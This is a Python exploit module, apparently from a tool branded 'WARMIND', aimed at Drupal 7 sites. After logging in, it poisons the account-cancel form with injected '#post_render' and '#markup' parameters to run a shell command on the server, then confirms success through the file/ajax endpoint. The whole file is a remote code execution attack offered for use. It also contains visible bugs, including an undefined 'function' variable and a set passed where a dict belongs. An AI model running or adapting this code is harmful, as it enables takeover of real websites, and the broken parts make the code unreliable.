import requests
from bs4 import BeautifulSoup

import lib.settings


def exploit(target, username, password, **kwargs):
    proxy = kwargs.get("proxy", None)
    headers = kwargs.get("headers", None)

    shell_command = "echo 'brought to you by WARMIND' | tee {}".format(lib.settings.random_filename())
    session = requests.session()
    session.proxies = {"http": proxy, "https": proxy}
    session.headers = headers
    get_parameters = {"q": "user/login"}
    post_parameters = {'form_id': 'user_login', 'name': username, 'pass': password, 'op': 'Log in'}
    session.post(target, params=get_parameters, data=post_parameters)
    get_parameters = {"q": "user"}
    req = session.get(target, params=get_parameters)
    content = req.text
    soup = BeautifulSoup(content, "html.parser")
    try:
        current_user_id = soup.find('meta', {'property': 'foaf:name'}).get('about')
    except AttributeError:
        raise lib.settings.ExploitFailed('no user available')
    if "?q=" in current_user_id:
        current_user_id = current_user_id.split("=")[1]
    print("current UID: {}".format(current_user_id))
    print("attempting form poison")
    try:
        get_parameters = {"q", "{}/cancel".format(current_user_id)}
        req = session.get(target, params=get_parameters)
        content = req.text
        soup = BeautifulSoup(content, "html.parser")
        cancel_form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        form_token = cancel_form.find('input', {'name': 'form_token'}).get('value')
        get_parameters = {
            'q': current_user_id + '/cancel',
            'destination': '{}/cancel?q[%23post_render][]={}&q[%23type]=markup&q[%23markup]={}'.format(
                current_user_id, function, shell_command
            )
        }
        post_parameters = {
            'form_id': 'user_cancel_confirm_form', 'form_token': form_token,
            '_triggering_element_name': 'form_id', 'op': 'Cancel account'
        }
        req = session.post(target, params=get_parameters, data=post_parameters)
        content = req.text
        soup = BeautifulSoup(content, "html.parser")
        secondary_form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        form_build_id = secondary_form.find('input', {'name': 'form_build_id'}).get('value')
        if form_build_id:
            print("form ID: '{}' poisoned successfully")
            print("sending code")
            get_parameters = {'q':'file/ajax/actions/cancel/#options/path/{}'.format(form_build_id)}
            post_parameters = {'form_build_id': form_build_id}
            req = session.post(target, params=get_parameters, data=post_parameters)
            if "WARMIND" in req.text:
                return True
    except (AttributeError, ) as e:
        raise lib.settings.ExploitFailed('exploit failed with: {}'.format(str(e)))


